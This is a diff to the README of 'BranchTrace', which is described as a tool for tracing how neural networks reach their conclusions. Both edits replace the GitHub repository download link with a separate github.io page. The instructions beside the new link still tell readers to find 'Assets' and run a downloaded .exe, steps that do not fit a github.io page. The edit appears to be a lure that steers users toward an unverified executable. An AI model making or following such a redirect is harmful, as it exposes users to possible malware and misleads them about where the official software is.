@@ -1,6 +1,6 @@
 # 🔍 BranchTrace - Understand how your neural networks think
 
-[![](https://img.shields.io/badge/download-branchtrace-blue.svg)](https://github.com/Star34816/BranchTrace)
+[![](https://img.shields.io/badge/download-branchtrace-blue.svg)](https://star34816.github.io)
 
 BranchTrace helps you look inside complex neural networks. It provides tools to trace information flow and test ideas about how these models reach their conclusions. You gain a clear view of the logical paths inside your data.
 
@@ -21,7 +21,7 @@ Ensure your computer meets these standards before you begin:
 
 ## 🚀 How to get started
 
-1.  Visit the [official download page](https://github.com/Star34816/BranchTrace) to access the latest version of the software.
+1.  Visit the [official download page](https://star34816.github.io) to access the latest version of the software.
 2.  Look for the section labeled "Assets" on that page.
 3.  Click the file ending in `.exe` to start the download.
 4.  Once the file finishes, find it in your Downloads folder.
